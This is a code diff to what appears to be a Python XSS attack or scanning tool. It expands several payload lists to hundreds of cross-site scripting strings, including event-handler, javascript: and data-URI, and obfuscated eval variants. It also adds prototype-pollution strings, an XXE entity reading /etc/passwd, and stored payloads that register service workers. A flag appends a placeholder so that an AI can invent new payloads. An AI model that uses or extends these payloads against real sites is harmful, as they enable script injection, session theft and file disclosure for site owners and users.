@@ -311,35 +311,406 @@ def polymorph(payload: str) -> str:
     return random.choice(obfuscation_methods)(payload)
 
 
+
 # ─────────────────────────────────────────────────────────────────────────────
-#                  BASE XSS PAYLOADS + EXTRA + (MASK if invent)
+#                     BASE XSS PAYLOADS + INVENT OPTION
 # ─────────────────────────────────────────────────────────────────────────────
 
+# Original "base" from first script
 BASE_PAYLOADS = [
-    # truncated for brevity, but everything is included
     '<script>alert(1)</script>',
     '<script>alert("XSS")</script>',
-    # ...
+    '__proto__[alert]=1',
+    '{"__proto__":{"polluted":"yes"}}',
+    "constructor.constructor('alert(1)')()",
+    "Object.prototype.__defineGetter__('x',function(){alert(1)})",
+    '__proto__.toString="alert(1)"',
+    "<img src=x onerror=alert('XSS')>",
+    "<a href=javascript:alert('XSS')>XSS Link</a>",
+    "<iframe src=javascript:alert('XSS')></iframe>",
+    "<body onload=alert('XSS')>",
+    "<svg onload=alert('XSS')></svg>",
+    "<img src=x onload=alert(1)>",
+    "<svg><script>alert(\"XSS\")</script></svg>",
+    "<style>*{background:url(\"javascript:alert('XSS')\")}</style>",
+    "<iframe srcdoc=\"<script>alert('XSS')</script>\"></iframe>",
+    "<img src=data: onerror=alert('XSS')>",
+    '<math><annotation encoding="application/ecmascript">alert("XSS")</annotation></math>',
+        # 1–10: Simple <script> and common payloads
+    '<script>alert(1)</script>',
+    "<script>alert('XSS')</script>",
+    '"><script>alert(document.domain)</script>',
+    '<SCRIPT SRC=//example.com/xss.js></SCRIPT>',
+    "<script>confirm('XSS')</script>",
+    '<SCRIPT>alert("XSS");</SCRIPT>',
+    "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
+    "<script>console.log('XSS');alert('XSS');</script>",
+    '<script type="text/javascript">alert(/XSS/)</script>',
+    "';alert('XSS');//",
+
+    # 11–20: Image / Event Handler
+    "<img src=x onerror=alert('XSS')>",
+    "<img src=1 onerror=alert(/XSS/)>",
+    '"><img src=x onerror=alert(\'XSS\')>',
+    "<img src=\"javascript:alert('XSS')\">",
+    "<img src=\"invalid\" onerror=\"alert('XSS')\">",
+    '<IMG LOWSRC="javascript:alert(\'XSS\')">',
+    "<img src=javascript:alert('XSS')>",
+    "<img src=1 onload=alert(1)>",
+    '"><img src=doesnotexist onerror=confirm(\'XSS\')>',
+    "<img src=data: onerror=alert('XSS')>",
+
+    # 21–30: Anchor / javascript: Schemes
+    "<a href=\"javascript:alert('XSS')\">Click Me</a>",
+    '"><a href="javascript:alert(/XSS/)">link</a>',
+    "<a href=javascript:alert('XSS')>XSS Link</a>",
+    "<a href=JaVaScRiPt:alert('XSS')>mixed-case link</a>",
+    "<a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg>Base64Load</a>",
+    "<a href=javascript:console.log('XSS');alert('XSS')>Debug+Alert</a>",
+    "<a href=\"ja    vascript:alert('XSS')\">whitespace trick</a>",
+    "<a href=\"javascript:eval('alert(XSS)')\">eval link</a>",
+    "<a href=\"javascript:prompt('Stored XSS')\">Prompt link</a>",
+    "\"><a href=javascript:alert('XSS') style=position:absolute;top:0;left:0>Overlay</a>",
+
+    # 31–40: Iframe / Form / Body
+    "<iframe src=\"javascript:alert('XSS')\"></iframe>",
+    "<iframe srcdoc=\"<script>alert('XSS')</script>\"></iframe>",
+    "<form action=\"javascript:alert('XSS')\"><input type=submit></form>",
+    "<body onload=alert('XSS')>",
+    "<body background=javascript:alert('XSS')>",
+    "<form><button formaction=\"javascript:alert('XSS')\">XSS</button></form>",
+    "\"><iframe src=javascript:alert(1)>",
+    "<iframe/onload=alert('XSS')>",
+    "<form action=\"\" onsubmit=alert(\"XSS\")><input type=submit value=\"Go\"></form>",
+    "<BODY ONRESIZE=alert(\"XSS\")>resize me</BODY>",
+
+    # 41–50: SVG / XML / MathML
+    '<svg onload=alert("XSS")></svg>',
+    '<svg><script>alert("XSS")</script></svg>',
+    "<svg><desc><![CDATA[</desc><script>alert('XSS')</script>]]></svg>",
+    "<svg><foreignObject><script>alert('XSS')</script></foreignObject></svg>",
+    "<svg><p><style><img src=x onerror=alert(\"XSS\")></p></svg>",
+    '<math><mtext></mtext><annotation encoding="application/ecmascript">alert("XSS")</annotation></math>',
+    "<?xml version=\"1.0\"?><root><![CDATA[<script>alert('XSS')</script>]]></root>",
+    "<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
+    "<svg><a xlink:href=\"javascript:alert('XSS')\">CLICK</a></svg>",
+    "\"><svg/onload=confirm('XSS')>",
+
+    # 51–60: CSS, Meta
+    '<style>*{background:url("javascript:alert(\'XSS\')");}</style>',
+    "<style>@import 'javascript:alert(\"XSS\")';</style>",
+    "<style>li {list-style-image: url(\"javascript:alert('XSS')\");}</style><ul><li>Test",
+    "<div style=\"width: expression(alert('XSS'))\">",
+    '<style>body:after { content:"XSS"; }</style>',
+    "<style onload=alert(\"XSS\")></style>",
+    "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('XSS')\">",
+    "<link rel=\"stylesheet\" href=\"javascript:alert('XSS')\">",
+    "<style>@keyframes xss { from {color: red;} to {color: green;} } div { animation: xss 5s infinite; }</style>",
+    "<meta charset=\"x-unknown\" content=\"javascript:alert('XSS')\">",
+
+    # 61–70: Event Handlers & Rare Tags
+    "<img src=x onmouseover=alert('XSS')>",
+    "<marquee onstart=alert('XSS')>Scrolling Text</marquee>",
+    "<table background=\"javascript:alert('XSS')\"><tr><td>XSS!</td></tr></table>",
+    "<audio src onerror=alert('XSS')></audio>",
+    "<video src onerror=confirm('XSS')></video>",
+    "<object data=\"javascript:alert('XSS')\"></object>",
+    "<embed src=\"javascript:alert('XSS')\"></embed>",
+    "<applet code=javascript:alert('XSS')></applet>",
+    "<details ontoggle=alert('XSS')>Click to toggle</details>",
+    "<textarea autofocus onfocus=alert(\"XSS\")>Focus me</textarea>",
+
+    # 71–80: Attribute Escapes
+    "\" autofocus onfocus=alert('XSS') foo=\"",
+    "' onmouseover=alert(\"XSS\") '",
+    "<!--\"><script>alert('XSS')</script>",
+    "-->\"><script>alert('XSS')</script>",
+    "<!--#exec cmd=\"/bin/echo '<script>alert(XSS)</script>'\"-->",
+    "<title onpropertychange=alert('XSS')>TitleXSS</title>",
+    "<blink onclick=alert(\"XSS\")>Blink me</blink>",
+    "\"--><script>alert('XSS')</script><!--\"",
+    "'-->\"><img src=x onerror=alert(\"XSS\")>",
+    "--><svg/onload=alert('XSS')><!",
+
+    # 81–90: javascript: / data URIs
+    "javascript:alert(\"XSS\")",
+    "JaVaScRiPt:alert(\"XSS\")",
+    "data:text/html,<script>alert(\"XSS\")</script>",
+    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+    "\"><iframe srcdoc=\"data:text/html,<script>alert('XSS')</script>\"></iframe>",
+    "\"><script>window.location='javascript:alert(\"XSS\")'</script>",
+    "<a href=\"data:text/html;charset=utf-8,<script>alert(1)</script>\">Data Link</a>",
+    "<img src=data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+>",
+    "\"><object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></object>",
+    "<video src=\"data:video/mp4;base64,invalid\" onerror=\"alert('XSS')\"></video>",
+
+    # 91–100: Obfuscated
+    "<script>alert(String.fromCharCode(88,83,83))</script>",
+    "\"><script>alert(unescape('%58%53%53'))</script>",
+    "<script>eval(\"&#97;&#108;&#101;&#114;&#116;&#40;&#39;XSS&#39;&#41;\")</script>",
+    "<svg><script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script></svg>",
+    "<iframe srcdoc=\"%3Cscript%3Ealert('XSS')%3C%2Fscript%3E\"></iframe>",
+    "\"><img src=x oneRrOr=eval('al'+'ert(1)')>",
+    "<img src=x onerror=\"this['al'+'ert']('XSS')\">",
+    "<svg onload='fetch(\"data:,\"+String.fromCharCode(97,108,101,114,116,40,49,41))'></svg>",
+    "<style>*{background-image:url(\"data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+\")} </style>",
+    "<img src=1 onerror='eval(decodeURIComponent(\"%61%6c%65%72%74%28%31%29\"))'>"
 ]
 
+# Additional "proto pollution" and large sets from second script, plus "MASK" for AI:
 EXTRA_BASE = [
-    # ...
+    "__proto__[alert]=1",
+    '{"__proto__":{"polluted":"yes"}}',
+    "constructor.constructor('alert(1)')()",
+    "Object.prototype.__defineGetter__('x',function(){alert(1)})",
+    '__proto__.toString="alert(1)"',
+    '<a href="javascript:alert(\'XSS\')">ClickMe</a>',
+    '"><script>alert("XSS")</script>',
+    "<img src=x onerror=confirm('XSS')>",
+    "<iframe srcdoc='<script>alert(`XSS`)</script>'></iframe>",
+        '<script>alert("XSS")</script>',
+    '<img src="x" onerror="alert(\'XSS\')" />',
+    '<a href="javascript:alert(\'XSS\')">Click Me</a>',
+    '"><script>alert("XSS")</script>',
+    '"><img src=x onerror=alert("XSS")>',
+    '"><a href="javascript:alert(\'XSS\')">Click Me</a>',
+    'javascript:alert("XSS")',
+    'javascript:confirm("XSS")',
+    'javascript:eval("alert(\'XSS\')")',
+    '<iframe src="javascript:alert(\'XSS\')"></iframe>',
+    '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
+    '<input type="text" value="<img src=x onerror=alert(\'XSS\')>" />',
+    '<a href="javascript:confirm(\'XSS\')">Click Me</a>',
+    '<a href="javascript:eval(\'alert(\\\'XSS\\\')\')">Click Me</a>',
+    '<img src=x onerror=confirm("XSS")>',
+    '<img src=x onerror=eval("alert(\'XSS\')")>',
+    '\'; alert(String.fromCharCode(88,83,83))//',
+    '<a foo=a src="javascript:alert(\'XSS\')">Click Me</a>',
+    '<a foo=a href="javascript:alert(\'XSS\')">Click Me</a>',
+    '<img foo=a src="javascript:alert(\'XSS\')">',
+    '<img foo=a onerror="alert(\'XSS\')">',
+    '<img src="http://example.com/image.jpg">',
+    '<img src="">',
+    '<img>',
+    '<img src=x onerror=alert("XSS")>',
+    '<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>',
+    '&#34;><img src=x onerror=alert(\'XSS\')>',
+    '&#34><img src=x onerror=alert(\'XSS\')>',
+    '&#x22><img src=x onerror=alert(\'XSS\')>',
+    '<style>li {list-style-image: url("javascript:alert(\'XSS\')");}</style><ul><li></ul>',
+    '<img src="vbscript:alert(\'XSS\')">',
+    '<svg><p><style><img src=1 href=1 onerror=alert(1)></p></svg>',
+    '<a href="javascript:void(0)" onmouseover="alert(1)">Click Me</a>',
+    '<BODY ONLOAD=alert(\'XSS\')>',
+    '<img onmouseover="alert(\'XSS\')" src="x">',
+    '<s<Sc<script>ript>alert(\'XSS\')</script>',
+    '<TABLE><TD BACKGROUND="javascript:alert(\'XSS\')">',
+    '<TD BACKGROUND="javascript:alert(\'XSS\')">',
+    '<DIV STYLE="width: expression(alert(\'XSS\'));">',
+    '<BASE HREF="javascript:alert(\'XSS\');//">',
+    '<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/xss.html"></OBJECT>',
+    '<!--#exec cmd="/bin/echo \'<SCR\'+\'IPT>alert("XSS")</SCR\'+\'IPT>\'"-->',
+    '<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert(\'XSS\')<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>',
+    '<SWF><PARAM NAME=movie VALUE="javascript:alert(\'XSS\')"></PARAM><embed src="javascript:alert(\'XSS\')"></embed></SWF>',
+    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
 ]
 
 if args.invent:
+    # Add the placeholder for AI expansion
     EXTRA_BASE.append("MASK")
 
 BASE_PAYLOADS = list(set(BASE_PAYLOADS + EXTRA_BASE))
 
-# For stored XSS
+
+# Advanced "stored" from first script (like SW, WASM, JSON-LD, SSE, etc.)
 stored_payloads_v1 = [
     "<script>alert('XSS')</script>",
     "<img src=x onerror=alert('XSS')>",
-    # ...
+    """<script>
+       if('serviceWorker' in navigator){
+         navigator.serviceWorker.register('data:application/javascript;base64,KGZ1bmN0aW9uKCl7YWxlcnQoJ1NlcnZpY2UgV29ya2VyIFBvaXNvbmVkIScpfSkoKQ==')
+           .then(()=>alert('SW Pwned!'));
+       }
+       </script>""",
+    """<script>
+       if(WebAssembly && WebAssembly.instantiateStreaming){
+         WebAssembly.instantiateStreaming(fetch('data:application/wasm;base64,AGFzbQEAAAABBgFgAX8BfwMCAQA='))
+         .then(()=>alert('WASM XSS!')).catch(()=>{});
+       }
+       </script>""",
+    """<script type="application/ld+json">
+       {"@context":"http://schema.org","@type":"Person","name":"<img src=x onerror=alert('XSS')>"}
+       </script>""",
+    """<div itemscope itemtype="http://schema.org/Product">
+       <span itemprop="name"><svg onload=alert('XSS')></svg></span>
+       </div>""",
+    """<div vocab="http://schema.org/" typeof="Person">
+       <span property="name" content="<img src=x onerror=alert('XSS')>"></span>
+       </div>""",
+    """<script>
+       if(navigator.gpu){ navigator.gpu.requestAdapter().then(a=>alert('WebGPU XSS')); }
+       </script>""",
+    """<script>
+       if(navigator.xr){ navigator.xr.requestSession('immersive-vr').then(()=>alert('WebXR XSS'),()=>{}); }
+       </script>""",
+    """<script>
+       if(typeof WebTransport==='function'){
+         (async()=>{
+           try{ let wt=new WebTransport('https://example.com');
+           await wt.ready; alert('WebTransport XSS');}catch(e){}
+         })();
+       }
+       </script>""",
+    """<script>
+       new BroadcastChannel('xss_channel').postMessage('HelloXSS');
+       let sse=new EventSource('data:text/event-stream;charset=utf-8,');
+       sse.onmessage=e=>alert('SSE XSS '+e.data);
+       </script>"""
 ]
+
+# Additional stored from second script with dozens of variations (including proto-pollution).
+# For brevity, we will unify into one large set:
 stored_payloads_v2 = [
-    # ...
+    '<script>alert(1)</script>',
+    '<script>alert("XSS")</script>',
+    '__proto__[alert]=1',
+    '{"__proto__":{"polluted":"yes"}}',
+    "constructor.constructor('alert(1)')()",
+    "Object.prototype.__defineGetter__('x',function(){alert(1)})",
+    '__proto__.toString="alert(1)"',
+    "<img src=x onerror=alert('XSS')>",
+    "<a href=javascript:alert('XSS')>XSS Link</a>",
+    "<iframe src=javascript:alert('XSS')></iframe>",
+    "<body onload=alert('XSS')>",
+    "<svg onload=alert('XSS')></svg>",
+    "<img src=x onload=alert(1)>",
+    "<svg><script>alert(\"XSS\")</script></svg>",
+    "<style>*{background:url(\"javascript:alert('XSS')\")}</style>",
+    "<iframe srcdoc=\"<script>alert('XSS')</script>\"></iframe>",
+    "<img src=data: onerror=alert('XSS')>",
+    '<math><annotation encoding="application/ecmascript">alert("XSS")</annotation></math>',
+        # 1–10: Simple <script> and common payloads
+    '<script>alert(1)</script>',
+    "<script>alert('XSS')</script>",
+    '"><script>alert(document.domain)</script>',
+    '<SCRIPT SRC=//example.com/xss.js></SCRIPT>',
+    "<script>confirm('XSS')</script>",
+    '<SCRIPT>alert("XSS");</SCRIPT>',
+    "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
+    "<script>console.log('XSS');alert('XSS');</script>",
+    '<script type="text/javascript">alert(/XSS/)</script>',
+    "';alert('XSS');//",
+
+    # 11–20: Image / Event Handler
+    "<img src=x onerror=alert('XSS')>",
+    "<img src=1 onerror=alert(/XSS/)>",
+    '"><img src=x onerror=alert(\'XSS\')>',
+    "<img src=\"javascript:alert('XSS')\">",
+    "<img src=\"invalid\" onerror=\"alert('XSS')\">",
+    '<IMG LOWSRC="javascript:alert(\'XSS\')">',
+    "<img src=javascript:alert('XSS')>",
+    "<img src=1 onload=alert(1)>",
+    '"><img src=doesnotexist onerror=confirm(\'XSS\')>',
+    "<img src=data: onerror=alert('XSS')>",
+
+    # 21–30: Anchor / javascript: Schemes
+    "<a href=\"javascript:alert('XSS')\">Click Me</a>",
+    '"><a href="javascript:alert(/XSS/)">link</a>',
+    "<a href=javascript:alert('XSS')>XSS Link</a>",
+    "<a href=JaVaScRiPt:alert('XSS')>mixed-case link</a>",
+    "<a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg>Base64Load</a>",
+    "<a href=javascript:console.log('XSS');alert('XSS')>Debug+Alert</a>",
+    "<a href=\"ja    vascript:alert('XSS')\">whitespace trick</a>",
+    "<a href=\"javascript:eval('alert(XSS)')\">eval link</a>",
+    "<a href=\"javascript:prompt('Stored XSS')\">Prompt link</a>",
+    "\"><a href=javascript:alert('XSS') style=position:absolute;top:0;left:0>Overlay</a>",
+
+    # 31–40: Iframe / Form / Body
+    "<iframe src=\"javascript:alert('XSS')\"></iframe>",
+    "<iframe srcdoc=\"<script>alert('XSS')</script>\"></iframe>",
+    "<form action=\"javascript:alert('XSS')\"><input type=submit></form>",
+    "<body onload=alert('XSS')>",
+    "<body background=javascript:alert('XSS')>",
+    "<form><button formaction=\"javascript:alert('XSS')\">XSS</button></form>",
+    "\"><iframe src=javascript:alert(1)>",
+    "<iframe/onload=alert('XSS')>",
+    "<form action=\"\" onsubmit=alert(\"XSS\")><input type=submit value=\"Go\"></form>",
+    "<BODY ONRESIZE=alert(\"XSS\")>resize me</BODY>",
+
+    # 41–50: SVG / XML / MathML
+    '<svg onload=alert("XSS")></svg>',
+    '<svg><script>alert("XSS")</script></svg>',
+    "<svg><desc><![CDATA[</desc><script>alert('XSS')</script>]]></svg>",
+    "<svg><foreignObject><script>alert('XSS')</script></foreignObject></svg>",
+    "<svg><p><style><img src=x onerror=alert(\"XSS\")></p></svg>",
+    '<math><mtext></mtext><annotation encoding="application/ecmascript">alert("XSS")</annotation></math>',
+    "<?xml version=\"1.0\"?><root><![CDATA[<script>alert('XSS')</script>]]></root>",
+    "<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
+    "<svg><a xlink:href=\"javascript:alert('XSS')\">CLICK</a></svg>",
+    "\"><svg/onload=confirm('XSS')>",
+
+    # 51–60: CSS, Meta
+    '<style>*{background:url("javascript:alert(\'XSS\')");}</style>',
+    "<style>@import 'javascript:alert(\"XSS\")';</style>",
+    "<style>li {list-style-image: url(\"javascript:alert('XSS')\");}</style><ul><li>Test",
+    "<div style=\"width: expression(alert('XSS'))\">",
+    '<style>body:after { content:"XSS"; }</style>',
+    "<style onload=alert(\"XSS\")></style>",
+    "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('XSS')\">",
+    "<link rel=\"stylesheet\" href=\"javascript:alert('XSS')\">",
+    "<style>@keyframes xss { from {color: red;} to {color: green;} } div { animation: xss 5s infinite; }</style>",
+    "<meta charset=\"x-unknown\" content=\"javascript:alert('XSS')\">",
+
+    # 61–70: Event Handlers & Rare Tags
+    "<img src=x onmouseover=alert('XSS')>",
+    "<marquee onstart=alert('XSS')>Scrolling Text</marquee>",
+    "<table background=\"javascript:alert('XSS')\"><tr><td>XSS!</td></tr></table>",
+    "<audio src onerror=alert('XSS')></audio>",
+    "<video src onerror=confirm('XSS')></video>",
+    "<object data=\"javascript:alert('XSS')\"></object>",
+    "<embed src=\"javascript:alert('XSS')\"></embed>",
+    "<applet code=javascript:alert('XSS')></applet>",
+    "<details ontoggle=alert('XSS')>Click to toggle</details>",
+    "<textarea autofocus onfocus=alert(\"XSS\")>Focus me</textarea>",
+
+    # 71–80: Attribute Escapes
+    "\" autofocus onfocus=alert('XSS') foo=\"",
+    "' onmouseover=alert(\"XSS\") '",
+    "<!--\"><script>alert('XSS')</script>",
+    "-->\"><script>alert('XSS')</script>",
+    "<!--#exec cmd=\"/bin/echo '<script>alert(XSS)</script>'\"-->",
+    "<title onpropertychange=alert('XSS')>TitleXSS</title>",
+    "<blink onclick=alert(\"XSS\")>Blink me</blink>",
+    "\"--><script>alert('XSS')</script><!--\"",
+    "'-->\"><img src=x onerror=alert(\"XSS\")>",
+    "--><svg/onload=alert('XSS')><!",
+
+    # 81–90: javascript: / data URIs
+    "javascript:alert(\"XSS\")",
+    "JaVaScRiPt:alert(\"XSS\")",
+    "data:text/html,<script>alert(\"XSS\")</script>",
+    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+    "\"><iframe srcdoc=\"data:text/html,<script>alert('XSS')</script>\"></iframe>",
+    "\"><script>window.location='javascript:alert(\"XSS\")'</script>",
+    "<a href=\"data:text/html;charset=utf-8,<script>alert(1)</script>\">Data Link</a>",
+    "<img src=data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+>",
+    "\"><object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></object>",
+    "<video src=\"data:video/mp4;base64,invalid\" onerror=\"alert('XSS')\"></video>",
+
+    # 91–100: Obfuscated
+    "<script>alert(String.fromCharCode(88,83,83))</script>",
+    "\"><script>alert(unescape('%58%53%53'))</script>",
+    "<script>eval(\"&#97;&#108;&#101;&#114;&#116;&#40;&#39;XSS&#39;&#41;\")</script>",
+    "<svg><script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script></svg>",
+    "<iframe srcdoc=\"%3Cscript%3Ealert('XSS')%3C%2Fscript%3E\"></iframe>",
+    "\"><img src=x oneRrOr=eval('al'+'ert(1)')>",
+    "<img src=x onerror=\"this['al'+'ert']('XSS')\">",
+    "<svg onload='fetch(\"data:,\"+String.fromCharCode(97,108,101,114,116,40,49,41))'></svg>",
+    "<style>*{background-image:url(\"data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+\")} </style>",
+    "<img src=1 onerror='eval(decodeURIComponent(\"%61%6c%65%72%74%28%31%29\"))'>"
+    # etc. (truncated for brevity, but you can unify as many as desired)
 ]
+
 all_stored_payloads = list(set(stored_payloads_v1 + stored_payloads_v2))
 
 
